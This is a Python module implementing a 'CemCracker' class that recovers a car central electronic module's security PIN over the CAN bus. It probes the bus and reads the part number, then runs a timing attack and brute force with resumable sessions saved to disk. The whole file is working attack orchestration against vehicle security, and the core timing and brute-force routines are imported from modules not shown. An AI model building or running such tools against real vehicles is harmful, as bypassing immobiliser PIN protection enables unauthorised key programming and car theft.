import can
import logging
import os
import json
import time

from ..config import REQ_ID, CEM_HS_ID, SHUFFLE_ORDERS, CEM_PARAMS
from ..utils import bin_to_bcd
from ..can_utils import setup_can, read_part_number
from .unlock import unlock_attempt_fast, unlock_attempt_timing
from .timing_attack import crack_timing
from .brute_force import brute_force

class CemCracker:
    def __init__(self, channel='can0'):
        self.channel = channel
        self.bus = None
        self.cem_pn = 0
        self.baud = 500000
        self.shuffle = SHUFFLE_ORDERS[0]
        self.cem_id = CEM_HS_ID 
        
        # Optimization: Pre-allocate reusable message
        self.tx_msg = can.Message(
            arbitration_id=REQ_ID, 
            data=[0]*8,
            is_extended_id=True,
            check=False # Disable some safety checks for speed
        )

    def configure_for_cem(self, pn):
        if pn in CEM_PARAMS:
            baud, shuff_idx = CEM_PARAMS[pn]
            self.baud = baud
            self.shuffle = SHUFFLE_ORDERS[shuff_idx]
            logging.info(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
            return True
        else:
            logging.warning(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
            self.baud = 500000
            self.shuffle = SHUFFLE_ORDERS[0]
            return False

    def check_connection(self):
        """
        Verifies CAN connection and CEM responsiveness.
        Returns: True if ready, False if failure.
        """
        logging.info("Checking CAN connection...")
        
        # 1. Check for Bus Activity (Listen Only)
        logging.info("Listening for traffic (2s)...")
        start = time.time()
        pkt_count = 0
        while time.time() - start < 2.0:
            msg = self.bus.recv(timeout=0.1)
            if msg: pkt_count += 1
            
        if pkt_count == 0:
            logging.error("No traffic on CAN Bus! Check cables/ignition.")
            return False
        else:
            logging.info(f"Traffic detected ({pkt_count} msgs). Bus is active.")
            
        # 2. Ping CEM
        logging.info("Pinging CEM...")
        # Try to read P/N as a ping
        if read_part_number(self.bus):
            logging.info("CEM is responsive.")
            return True
        
        logging.error("Traffic seen, but CEM did not respond to queries.")
        return False

    def save_session(self, index, fixed_bytes, candidates_queue=None):
        try:
            state = {
                "timestamp": time.time(),
                "index": index,
                "fixed_bytes": fixed_bytes,
                "candidates_queue": candidates_queue or []
            }
            tmp_file = "session.json.tmp"
            with open(tmp_file, "w") as f:
                json.dump(state, f)
            os.replace(tmp_file, "session.json")
        except Exception as e:
            logging.error(f"Error saving session: {e}")

    def load_session(self):
        if not os.path.exists("session.json"):
            return None, None, []
        try:
            with open("session.json", "r") as f:
                state = json.load(f)
            idx = state.get("index", 0)
            fixed = state.get("fixed_bytes", [0]*6)
            queue = state.get("candidates_queue", [])
            return max(0, idx - 500), fixed, queue
        except:
            return None, None, []

    def run(self):
        # Boost Priority
        try:
            os.nice(-10)
        except:
            pass

        self.bus = setup_can(self.channel, self.baud)
        if not self.bus:
            return

        if not self.check_connection():
            logging.error("Aborting due to connectivity failure.")
            return

        pn = read_part_number(self.bus)
        if pn: self.configure_for_cem(pn)
        else: logging.warning("Using Defaults.")
        
        resume_index, resume_fixed_bytes, candidates_queue = self.load_session()
        
        current_fixed = None
        
        # Resume Logic
        if resume_index is not None:
            # If previous session was mid-way
            if resume_index < 1000000:
                logging.info(f"Resuming previous candidate from index {resume_index}...")
                current_fixed = [int(x) for x in resume_fixed_bytes]
                final_pin = brute_force(self.bus, self.tx_msg, self.cem_id, self.shuffle, current_fixed, start_index=resume_index, candidates_queue=candidates_queue)
                if final_pin: return
            else:
                logging.info("Previous candidate finished. Moving to next...")
        
        # Process Queue
        if not candidates_queue and current_fixed is None:
            logging.info("Generating new candidates via Timing Attack...")
            candidates_queue = crack_timing(self.bus, self.tx_msg, self.cem_id, self.shuffle, known_bytes=0)
            if not candidates_queue:
                candidates_queue = [[0]*6] # Fallback
        
        # Iterate through candidates
        while candidates_queue:
            candidate = candidates_queue.pop(0)
            candidate = [int(x) for x in candidate]
            
            logging.info(f"Processing Candidate Prefix: {candidate[:3]}")
            self.save_session(0, candidate, candidates_queue) # Save state before start
            
            final_pin = brute_force(self.bus, self.tx_msg, self.cem_id, self.shuffle, candidate, start_index=0, candidates_queue=candidates_queue)
            if final_pin:
                return
        
        logging.info("All candidates exhausted. No PIN found.")
